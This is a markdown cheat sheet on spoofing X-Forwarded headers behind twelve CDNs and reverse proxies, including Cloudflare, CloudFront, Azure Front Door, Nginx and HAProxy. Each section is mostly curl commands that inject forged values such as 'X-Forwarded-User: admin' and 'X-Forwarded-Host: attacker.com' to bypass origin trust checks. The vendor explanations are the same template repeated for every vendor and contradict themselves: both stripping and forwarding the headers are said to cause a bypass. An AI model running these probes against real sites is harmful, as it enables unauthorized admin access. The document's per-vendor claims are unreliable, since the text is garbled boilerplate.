# Per-CDN — every CDN the host header crosses, exhaustively

The CDN map — a CDN, the host-header check it gates.

---

## 1. Cloudflare — strips `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
Cloudflare strips the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — before the origin sees them. The origin's missing-header
fallback treats the request as local → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # Cloudflare strips it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # Cloudflare strips it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # Cloudflare strips it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # Cloudflare strips it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # Cloudflare strips it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # Cloudflare strips it
```

## 2. Fastly — strips `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
Fastly strips the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — before the origin sees them. The origin's missing-header
fallback treats the request as local → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # Fastly strips it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # Fastly strips it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # Fastly strips it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # Fastly strips it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # Fastly strips it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # Fastly strips it
```

## 3. AWS CloudFront — strips `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
AWS CloudFront strips the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — before the origin sees them. The origin's missing-header
fallback treats the request as local → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # CloudFront strips it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # CloudFront strips it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # CloudFront strips it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # CloudFront strips it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # CloudFront strips it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # CloudFront strips it
```

## 4. AWS ALB / NLB — forwards `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
AWS ALB / NLB forwards the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — to the origin. The origin trusts them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the ALB forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the ALB forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the ALB forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the ALB forwards it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # the ALB forwards it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # the ALB forwards it
```

## 5. AWS API Gateway — forwards `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
AWS API Gateway forwards the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — to the origin. The origin trusts them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the API Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the API Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the API Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the API Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # the API Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # the API Gateway forwards it
```

## 6. Google Cloud CDN / Load Balancer — strips `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
Google Cloud CDN / Load Balancer strips the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — before the origin sees them. The origin's
missing-header fallback treats the request as local → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the GCP CDN strips it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the GCP CDN strips it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the GCP CDN strips it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the GCP CDN strips it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # the GCP CDN strips it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # the GCP CDN strips it
```

## 7. Azure Front Door — strips `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
Azure Front Door strips the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — before the origin sees them. The origin's missing-header
fallback treats the request as local → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # Azure Front Door strips it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # Azure Front Door strips it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # Azure Front Door strips it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # Azure Front Door strips it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # Azure Front Door strips it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # Azure Front Door strips it
```

## 8. Azure Application Gateway — forwards `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
Azure Application Gateway forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts them
→ a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the App Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the App Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the App Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the App Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # the App Gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # the App Gateway forwards it
```

## 9. Nginx reverse-proxy — forwards `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
Nginx reverse-proxy forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts them
→ a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # Nginx forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # Nginx forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # Nginx forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # Nginx forwards it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # Nginx forwards it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # Nginx forwards it
```

## 10. Apache reverse-proxy — forwards `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
Apache reverse-proxy forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts them
→ a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # Apache forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # Apache forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # Apache forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # Apache forwards it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # Apache forwards it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # Apache forwards it
```

## 11. Traefik — forwards `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
Traefik forwards the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — to the origin. The origin trusts them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # Traefik forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # Traefik forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # Traefik forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # Traefik forwards it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # Traefik forwards it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # Traefik forwards it
```

## 12. HAProxy — forwards `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`

```text
HAProxy forwards the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — to the origin. The origin trusts them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # HAProxy forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # HAProxy forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # HAProxy forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # HAProxy forwards it
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # HAProxy forwards it
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # HAProxy forwards it
```
